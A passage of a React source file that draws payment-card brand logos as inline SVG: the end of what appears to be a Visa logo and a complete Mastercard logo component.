      <path d="M293.2 348.7l33.4-195.7h53.4l-33.4 195.7zM540.7 159.3c-10.6-4-27.2-8.3-47.9-8.3-52.8 0-90 26.6-90.2 64.7-.3 28.2 26.5 43.9 46.8 53.3 20.8 9.6 27.8 15.8 27.7 24.4-.1 13.2-16.6 19.2-32 19.2-21.4 0-32.7-3-50.3-10.2l-6.9-3.1-7.5 43.8c12.5 5.5 35.6 10.2 59.6 10.5 56.2 0 92.6-26.3 93-67.2.2-22.4-14.1-39.4-45-53.4-18.7-9.1-30.2-15.2-30.1-24.4 0-8.2 9.7-16.9 30.7-16.9 17.5-.3 30.2 3.5 40.1 7.5l4.8 2.3 7.2-42.2zM648.5 153h-41.3c-12.8 0-22.4 3.5-28 16.3l-79.4 179.4h56.1s9.2-24.1 11.2-29.4l68.5.1c1.6 6.9 6.5 29.3 6.5 29.3h49.6l-43.2-195.7zm-65.8 126.2c4.4-11.3 21.4-54.8 21.4-54.8-.3.5 4.4-11.4 7.1-18.8l3.6 17s10.3 47 12.5 56.6h-44.6zM232.8 153l-52.3 133.4-5.6-27.1c-9.7-31.2-39.9-65.1-73.7-82l47.8 171.2 56.6-.1 84.2-195.5h-57z" fill="#fff" />
      <path d="M131.9 153H45.8l-.7 4c67.1 16.2 111.5 55.4 129.9 102.5L156.4 170c-3.2-12.4-12.7-16.5-24.5-17z" fill="#f9a533" />
    </svg>
  );
}

function MastercardLogo() {
  return (
    <svg width="50" height="32" viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg" style={{ opacity: 0.9 }}>
      <circle cx="330" cy="250" r="170" fill="#eb001b" />
      <circle cx="450" cy="250" r="170" fill="#f79e1b" />
      <path d="M390 113.4c-41.6 32.5-68.3 82.2-68.3 138.1s26.7 105.6 68.3 138.1c41.6-32.5 68.3-82.2 68.3-138.1s-26.7-105.6-68.3-138.1z" fill="#ff5f00" />
    </svg>
  );
}
